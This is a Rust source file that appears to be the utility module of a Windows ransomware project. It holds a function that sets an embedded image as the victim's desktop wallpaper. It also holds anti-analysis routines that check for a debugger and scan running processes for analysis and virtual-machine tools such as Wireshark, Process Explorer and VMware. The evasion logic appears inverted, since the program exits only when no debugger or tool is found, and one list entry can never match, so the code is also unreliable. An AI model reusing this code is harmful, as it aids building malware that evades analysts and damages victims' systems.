// ==========================================================================// 
//                           UTILITY LIBRARY                                 // 
// ==========================================================================// 
/* I get the ideas from `https://github.com/cdong1012/Rust-Ransomware/blob/master/src/lib.rs` */


// ======================= IMPORTS ========================
extern crate winapi;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::{env, fs::File, io::Write, ptr::null_mut};
use winapi::{
    shared::minwindef::HMODULE,
    um::{
        debugapi::IsDebuggerPresent,
        handleapi::CloseHandle,
        processthreadsapi::OpenProcess,
        psapi::{EnumProcessModules, EnumProcesses, GetModuleBaseNameW},
        winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        winuser::{
            SystemParametersInfoW, SPIF_SENDWININICHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
        },
    },
};

// ======================= FUNCTIONS ========================

// Sets the desktop background to an image included in the binary
pub fn change_wallpaper() -> Result<(), String> {
    let image_data = include_bytes!("../resources/wallpaper.jpg");
    let mut temp_path = env::temp_dir();
    temp_path.push("background.jpg");

    let mut file = File::create(&temp_path)
        .map_err(|_| "Failed to create the temp file for the wallpaper")?;
    file
        .write_all(image_data)
        .map_err(|_| "Failed to write to the temp file")?;

    let path_str = temp_path
        .to_str()
        .ok_or("Failed to convert the path to string")?;
    let pwstr = str_to_pwstr(path_str);

    let success = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            pwstr.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE,
        ) != 0
    };

    if success {
        Ok(())
    } else {
        Err("Failed to change the wallpaper".into())
    }
}

// Converts a Rust string to a wide string vector for use with Windows APIs
fn str_to_pwstr(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// Implements basic anti-reversing techniques
pub fn anti_reversing() {
    if !debugger_present() && !check_suspicious_processes() {
        std::process::exit(0);
    }
}

// Checks for a debugger using the Windows API
fn debugger_present() -> bool {
    unsafe { IsDebuggerPresent() != 0 }
}

// Scans for processes and matches them against a list of known suspicious ones to detect virtual environments
fn check_suspicious_processes() -> bool {
    let mut processes = vec![0u32; 1024];
    let mut needed = 0u32;

    if unsafe {
        EnumProcesses(
            processes.as_mut_ptr(),
            (processes.len() * std::mem::size_of::<u32>()) as u32,
            &mut needed,
        )
    } == 0
    {
        return false;
    }

    let num_processes = needed as usize / std::mem::size_of::<u32>();
    processes[..num_processes].iter().any(|&pid| {
        if pid == 0 {
            return false;
        }
        let process_name = get_process_name(pid);
        process_name.is_some() && is_process_suspicious(&process_name.unwrap())
    })
}

// Retrieves the name of a process
fn get_process_name(pid: u32) -> Option<String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
        if process_handle.is_null() {
            return None;
        }

        let mut main_module = null_mut();
        let mut needed = 0;
        if EnumProcessModules(
            process_handle,
            &mut main_module,
            std::mem::size_of::<HMODULE>() as u32,
            &mut needed,
        ) == 0
        {
            CloseHandle(process_handle);
            return None;
        }

        let mut process_name = vec![0u16; needed as usize / 2];
        if GetModuleBaseNameW(
            process_handle,
            main_module,
            process_name.as_mut_ptr(),
            process_name.len() as u32,
        ) > 0
        {
            CloseHandle(process_handle);
            process_name.retain(|&c| c != 0);
            return Some(String::from_utf16(&process_name).unwrap());
        }

        CloseHandle(process_handle);
        None
    }
}

// Checks if the process name is in the list of known suspicious ones
fn is_process_suspicious(name: &str) -> bool {
    let suspicious_processes = [
        "vmsrvc", "tcpview", "wireshark", "fiddler", "vmware", "VirtualBox", 
        "procexp", "autoit", "vboxtray", "vmtoolsd", "vmrawdsk", "vmusbmouse", 
        "df5serv", "vboxservice",
    ];
    suspicious_processes
        .iter()
        .any(|&proc| name.to_lowercase().contains(proc))
}
